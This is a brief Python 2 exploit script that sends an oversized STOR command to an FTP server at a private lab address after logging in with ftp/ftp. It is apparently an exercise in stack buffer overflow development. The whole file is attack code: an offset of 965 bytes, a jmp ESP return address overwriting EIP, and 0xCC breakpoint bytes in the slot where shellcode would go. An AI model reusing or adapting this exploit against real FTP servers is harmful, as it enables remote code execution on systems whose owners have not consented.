#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# buffer = '\x41' * 965 + '\x5D\x38\x82\x7c' + '\x43' * 16 + '\xcc' * 1014
buffer = '\x41' * 965 + '\x0A\xAF\xD8\x77' + '\x43' * 16 + '\xcc' * 1014


#call ESP  0x7C82385D 
#jmp ESP 0x77D8AF0A

print "\nSending evil buffer..."

s.connect(('192.168.13.134',21))
data = s.recv(1024)
s.send('USER ftp' +'\r\n')
data = s.recv(1024)
s.send('PASS ftp' +'\r\n')
data = s.recv(1024)
s.send('STOR ' +buffer+'\r\n')
s.close()